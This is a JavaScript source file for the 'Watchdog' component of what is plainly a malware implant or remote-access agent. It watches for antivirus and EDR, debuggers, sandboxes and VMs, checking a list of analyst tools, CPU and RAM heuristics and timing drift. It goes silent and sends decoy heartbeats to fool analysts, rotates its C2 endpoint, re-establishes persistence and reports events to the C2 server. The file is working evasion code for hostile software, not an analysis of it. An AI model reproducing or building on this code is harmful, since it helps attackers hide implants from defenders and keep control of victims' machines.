/**
 * bixtx.com Link Agent — Watchdog
 *
 * Monitors agent health, detects environmental threats, guards modules against
 * crash loops, and hot-reloads failed modules.  Works in concert with
 * MutationEngine for evasion response.
 *
 * Threat model:
 *   • Module crashes repeatedly         → hot-reload up to MAX_MODULE_FAILURES times
 *   • C2 unreachable repeatedly         → trigger C2 endpoint rotation
 *   • AV/EDR process detected           → delegate to mutator emergency rotation
 *   • OS update changes kernel version  → re-establish persistence
 *   • Memory exhausted / CPU spiked     → mutation + report
 *   • Sandbox / debugger environment    → go silent, feed decoy traffic, evade
 *   • Network path changes (new IP/MAC) → signature rotation
 */

"use strict";

const os     = require("os");
const crypto = require("crypto");
const logger = require("../logger");
const config = require("../config");

const MAX_C2_FAILURES     = config.maxC2Failures     || 5;
const MAX_MODULE_FAILURES = config.maxModuleFailures  || 3;

// Sandbox process names that indicate an analysis environment
const SANDBOX_PROC_SIGNALS = new Set([
  // VM guest tools
  "vboxservice","vboxtray","vmtoolsd","vmwaretray","vmwareuser",
  // Network interceptors
  "wireshark","fiddler","fiddlerroot","proxifier","charles",
  // Windows process monitors
  "procmon","procmon64","procexp","procexp64",
  // Debuggers
  "ollydbg","x64dbg","x32dbg","idaq","idaq64","idaw","windbg",
  // Sandbox infrastructure
  "fakenet","inetsim","tcpdump","dumpcap","tshark","networkx",
  "cuckoo","cuckoomon","agent","sample",
  // .NET reversing
  "pestudio","de4dot","dnspy","ilspy","dotpeek",
  // Sysinternals
  "sysinternals","autorunsc","autoruns",
  // Android analysis
  "adbd",               // ADB daemon — device is being debugged via USB/WiFi ADB
  "qemu-system-arm","qemu-system-x86",  // Android emulator host process visible in guest
  // iOS analysis (visible in iSH / Sileo environment)
  "idevicesyslog","iproxy","ifuse",
  // Mobile instrumentation
  "frida-server","objection","drozer",
]);

class Watchdog {
  constructor(mutationEngine, modules, socket) {
    this.mutator  = mutationEngine;
    this.modules  = modules;     // live module map from index.js
    this.socket   = socket;

    this.c2Failures     = 0;
    this.moduleCrashes  = {};    // moduleName → count
    this.lastNetHash    = null;
    this.silenced       = false;

    this._avTimer       = null;
    this._osTimer       = null;
    this._healthTimer   = null;
    this._netTimer      = null;
    this._dbgTimer      = null;
    this._modTimer      = null;
  }

  // ── Public API ──────────────────────────────────────────────────────────────

  start() {
    if (!config.watchdogEnabled) {
      logger.debug("[Watchdog] Disabled via config");
      return;
    }

    // AV scan every 5 min
    this._avTimer     = setInterval(() => this._runAVScan(),       5 * 60_000);
    // OS update check every 10 min
    this._osTimer     = setInterval(() => this._checkOSUpdate(),  10 * 60_000);
    // Health telemetry every 60 s
    this._healthTimer = setInterval(() => this._healthCheck(),         60_000);
    // Network path monitor every 3 min
    this._netTimer    = setInterval(() => this._checkNetworkChange(),3 * 60_000);
    // Debugger/sandbox check every 30 min (don't over-poll — timing itself is a signal)
    this._dbgTimer    = setInterval(() => this._checkDebugger(),   30 * 60_000);
    // Module guardian every 20 s
    this._modTimer    = setInterval(() => this._guardModules(),        20_000);

    // Run startup checks immediately (staggered slightly so bootstrap completes first)
    setTimeout(() => this._runAVScan(),         8_000);
    setTimeout(() => this._checkDebugger(),    12_000);
    setTimeout(() => this._checkNetworkChange(),5_000);

    logger.debug("[Watchdog] Started — all monitors armed");
  }

  stop() {
    [this._avTimer, this._osTimer, this._healthTimer,
     this._netTimer, this._dbgTimer, this._modTimer].forEach(t => clearInterval(t));
  }

  onC2Failure() {
    this.c2Failures++;
    logger.warn(`[Watchdog] C2 failure #${this.c2Failures}`);
    if (this.c2Failures >= MAX_C2_FAILURES) {
      logger.warn("[Watchdog] Max C2 failures reached — rotating endpoint");
      this.c2Failures = 0;
      this.mutator?._rotateC2();
    }
  }

  onC2Success() {
    this.c2Failures = 0;
  }

  getStatus() {
    return {
      c2Failures:    this.c2Failures,
      moduleCrashes: { ...this.moduleCrashes },
      silenced:      this.silenced,
      lastNetHash:   this.lastNetHash?.slice(0, 12) || null,
    };
  }

  // ── Module guardian ─────────────────────────────────────────────────────────

  _guardModules() {
    for (const [name, mod] of Object.entries(this.modules)) {
      if (!mod || typeof mod.isHealthy !== "function") continue;
      try {
        if (!mod.isHealthy()) {
          this._handleModuleCrash(name, mod);
        }
      } catch (err) {
        this._handleModuleCrash(name, mod);
      }
    }
  }

  _handleModuleCrash(name, mod) {
    this.moduleCrashes[name] = (this.moduleCrashes[name] || 0) + 1;
    const count = this.moduleCrashes[name];
    logger.warn(`[Watchdog] Module '${name}' unhealthy (crash #${count})`);

    if (count >= MAX_MODULE_FAILURES) {
      logger.warn(`[Watchdog] Max crashes for '${name}' — attempting hot-reload`);
      this._hotReload(name, mod);
    }
  }

  _hotReload(name, mod) {
    try {
      // Stop the crashed module
      try { mod.stop?.(); } catch {}

      // Flush require cache for every file under src/modules/<name>.js
      const modPath = require.resolve(`./modules/${name}`) ||
                      require.resolve(`./${name}`);
      Object.keys(require.cache).forEach(k => {
        if (k.startsWith(modPath.replace(/\.js$/, ""))) delete require.cache[k];
      });

      // Reinstantiate
      const Klass    = require(`./modules/${name}`);
      const fresh    = new Klass(this.modules.beacon || null, this.socket);
      fresh.start?.();
      this.modules[name] = fresh;
      this.moduleCrashes[name] = 0;
      logger.info(`[Watchdog] Module '${name}' hot-reloaded successfully`);
      this._reportEvent("MODULE_RELOADED", { name });
    } catch (err) {
      logger.error(`[Watchdog] Hot-reload failed for '${name}':`, err.message);
      this._reportEvent("MODULE_RELOAD_FAILED", { name, error: err.message });
      this.mutator?.triggerEmergencyMutation(`module-reload-failure:${name}`);
    }
  }

  // ── AV / EDR scan ───────────────────────────────────────────────────────────

  _runAVScan() {
    this.mutator?.detectAV();
  }

  // ── OS update detection ─────────────────────────────────────────────────────

  _checkOSUpdate() {
    this.mutator?.detectOSUpdate();
  }

  // ── Health telemetry ────────────────────────────────────────────────────────

  async _healthCheck() {
    try {
      const si  = require("systeminformation");
      const [cpu, mem] = await Promise.all([si.currentLoad(), si.mem()]);

      const cpuPct = cpu.currentLoad;
      const memFree = (mem.available / mem.total) * 100;

      if (memFree < 5) {
        logger.warn(`[Watchdog] Critical low memory: ${memFree.toFixed(1)}% free`);
        this.mutator?.triggerEmergencyMutation("low-memory");
      } else if (cpuPct > 95) {
        logger.warn(`[Watchdog] CPU spike: ${cpuPct.toFixed(1)}%`);
        this.mutator?._signatureRotation();
      }

      this._reportEvent("WATCHDOG_HEALTH", {
        cpuPct:  Math.round(cpuPct),
        memFreePct: Math.round(memFree),
        platform:   config.platform,
        ts:         Date.now(),
      });
    } catch {}
  }

  // ── Network path monitor ─────────────────────────────────────────────────────

  _checkNetworkChange() {
    try {
      const ifaces = os.networkInterfaces();
      const repr   = Object.entries(ifaces)
        .flatMap(([name, addrs]) => (addrs || []).map(a => `${name}|${a.address}|${a.mac}`))
        .sort()
        .join(";");
      const hash   = crypto.createHash("sha1").update(repr).digest("hex");

      if (this.lastNetHash && hash !== this.lastNetHash) {
        logger.info("[Watchdog] Network path changed — signature rotation");
        this._reportEvent("NETWORK_CHANGE", { newHash: hash.slice(0, 12) });
        this.mutator?._signatureRotation();
      }
      this.lastNetHash = hash;
    } catch {}
  }

  // ── Debugger / sandbox detection ────────────────────────────────────────────

  async _checkDebugger() {
    // 1. Node inspector flags
    if (process.execArgv.some(a => a.includes("--inspect"))) {
      return this._sandboxDetected("node-inspect-flag");
    }

    // 2. Sandbox process scan
    try {
      const si = require("systeminformation");
      const { list } = await si.processes();
      const hit = list
        .map(p => p.name.toLowerCase().replace(/\.exe$/, ""))
        .find(n => SANDBOX_PROC_SIGNALS.has(n));
      if (hit) return this._sandboxDetected(`proc:${hit}`);
    } catch {}

    // 3. Timing anomaly
    const t0 = Date.now();
    await new Promise(r => setTimeout(r, 50));
    const drift = Date.now() - t0;
    if (drift > 600) return this._sandboxDetected(`timing-drift:${drift}ms`);

    // 4. VM heuristics
    const cpus = os.cpus().length;
    const ramGB = os.totalmem() / 1_073_741_824;
    if (cpus <= 1)   return this._sandboxDetected("single-cpu");
    if (ramGB < 1.5) return this._sandboxDetected("low-ram");

    // 5. Debugger env vars
    for (const key of ["NODE_OPTIONS","NODE_INSPECT_RESUME_ON_START"]) {
      if ((process.env[key] || "").includes("inspect")) {
        return this._sandboxDetected(`env:${key}`);
      }
    }
  }

  _sandboxDetected(reason) {
    if (this.silenced) return;
    this.silenced = true;
    logger.warn(`[Watchdog] Sandbox/debugger detected: ${reason} — going silent`);
    this._reportEvent("SANDBOX_DETECTED", { reason });

    // Feed decoy idle traffic to fool analyst, then evade
    let decoyCount = 0;
    const decoy = setInterval(() => {
      this.socket?.send("HEARTBEAT", { ts: Date.now() });
      if (++decoyCount >= 3) clearInterval(decoy);
    }, 15_000);

    const delay = Math.floor(Math.random() * 60_000) + 30_000;
    setTimeout(() => {
      this.silenced = false;
      this.mutator?.triggerEmergencyMutation(`post-sandbox:${reason}`);
    }, delay);
  }

  // ── C2 reporting ─────────────────────────────────────────────────────────────

  _reportEvent(type, data = {}) {
    try { this.socket?.send("WATCHDOG_EVENT", { event: type, ...data, ts: Date.now() }); } catch {}
  }
}

module.exports = Watchdog;
